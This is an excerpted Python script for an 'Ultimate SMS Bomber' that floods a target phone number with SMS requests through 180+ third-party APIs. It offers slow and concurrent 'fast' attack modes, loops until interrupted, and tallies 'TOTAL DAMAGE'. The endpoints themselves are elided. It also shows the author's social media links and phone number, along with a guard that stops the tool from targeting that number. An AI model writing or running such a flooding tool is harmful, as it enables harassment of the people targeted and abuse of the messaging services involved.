...
Created by: @ABDULLAHXTARDIGRADE
"""
...
def _sig_handler_1(signum, frame):
    ...
    print(f"{_c['p']}🔥 Created by: Abdullah x {_c['e']}")
    sys.exit(0)
...
def _print_banner():
    ...
    banner_lines = [
        ...
        "██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║",
        "╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝",
    " YouTube :https://www.youtube.com/@AbdullahX-333"
    "Facebook :https://www.facebook.com/share/1CMyngJ9CY/"
    "Instagram :https://www.instagram.com/mdtasnimabdullah?stkn=b3oxbnk1NmFncTZs"
    "TikTok:https ://www.tiktok.com/@abdullahx5819?_r=1&_t=ZS-99kmgyhTFCS"
    "Whatsapp :https://wa.me/8801340970280"
    "imo:https://s.imoim.net/H9SxET"
    "Telegram:https://t.me/ABDULLAHXTARDIGRADE"
        "",
        f"{_c['e']}{_c['c']}{'=' * 80}",
        f"{_c['r']}{_c['B']}💀 ULTIMATE SMS BOMBER - ALL 180+ APIs EDITION 💀{_c['c']}",
        f"{_c['y']}[ ALL 180+ APIs × SLOW & CONTROLLED × 5 REQUESTS EACH ]{_c['c']}",
        f"{_c['g']}[ ALL 180+ APIs × SLOW CONTROLLED × 5 REQUESTS EACH ]{_c['c']}",
        ...
        f"{_c['p']}Created by: {_c['w']}Abdullah x {_c['c']}",
        f"{'=' * 80}{_c['e']}"
    ]
...
def _format_phone_number(phone):
    ...
    full_number = f"0{cleaned}"
    if full_number == "01340970280":
        return "You cannot try this number😡"
...
class _ServiceManager:
    ...
    async def _run_all_services_slowly(self):
        ...
        print(f"{_c['y']}⚡ ALL 180+ APIs SENDING 5 REQUESTS EACH ONE BY ONE!{_c['e']}")
        ...
        async with aiohttp.ClientSession(
            ...
            print(f"{_c['c']}[SLOW MODE] Running 180+ services sequentially (each sends 5 requests)...{_c['e']}")
            ...
            print(f"{_c['g']}[TOTAL SENT] 170+ SMS requests sent (180+ APIs × 5 requests each){_c['e']}")

    async def _run_all_services_fast(self):
        print(f"\n{_c['r']}🚀 LAUNCHING FAST 180++ API ATTACK{_c['e']}")
        print(f"{_c['y']}⚡ ALL 180+ APIs - MAXIMUM SPEED CONCURRENT!{_c['e']}")
        ...
        async with aiohttp.ClientSession(
            ...
            print(f"{_c['c']}[FAST MODE] Running ALL 180+ APIs with maximum concurrency...{_c['e']}")
            ...
            print(f"\n{_c['g']}[ATTACK COMPLETE] Fast 180+ API attack finished!{_c['e']}")
            print(f"{_c['g']}[FAST SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
            print(f"{_c['g']}[TOTAL SENT] 500+ SMS requests sent (180+ APIs × 3 waves × fast speed){_c['e']}")
...
async def _main():
    ...
    _animate_loading("Initializing Ultimate 180+ API SMS Bomber", 2)
    ...
    print(f"{_c['g']}[1] SLOW MODE - All 180+ APIs (Slow & Controlled){_c['e']}")
    print(f"{_c['r']}[2] FAST MODE - All 180++ APIs (Maximum Speed){_c['e']}")
    
    while True:
        mode_choice = input(f"\n{_c['c']}[MODE] Choose mode (1 or 2): {_c['w']}").strip()
        if mode_choice == "1":
            _current_mode = 'slow'
            print(f"{_c['g']}✅ SLOW MODE selected - All 180+ APIs{_c['e']}")
            break
        elif mode_choice == "2":
            _current_mode = 'fast'
            print(f"{_c['r']}✅ FAST MODE selected - All 180+ APIs{_c['e']}")
            break
        else:
    ...
    if _current_mode == 'fast':
        print(f"\n{_c['r']}⚠️  WARNING: FAST 180++ API BOMBING MODE!{_c['e']}")
        print(f"{_c['r']}⚠️  This will send requests very fast until CTRL+C!{_c['e']}")
        print(f"{_c['y']}🔥 180+ APIs × 3 waves × concurrent = MAXIMUM SPEED!{_c['e']}")
        ...
        print(f"{_c['y']}🔄 180+ APIs × 5 requests each × slow speed = CONTROLLED POWER!{_c['e']}")
    ...
    try:
        while True:
            ...
            attack_type = "Fast 180+ API" if _current_mode == 'fast' else "Slow 180+ API"
            print(f"\n{_c['g']}[CYCLE COMPLETE] {attack_type} Attack #{cycle_count} finished{_c['e']}")
            print(f"{_c['g']}[RUNTIME] {_c['y']}{elapsed/60:.1f} minutes{_c['e']}")
            if _current_mode == 'fast':
                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent via 180+ Fast APIs{_c['e']}")
            else:
                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent via 180+ APIs{_c['e']}")
...
if __name__ == "__main__":
    print(f"{_c['g']}🚀 Starting Ultimate 180+ API SMS Bomber...{_c['e']}")
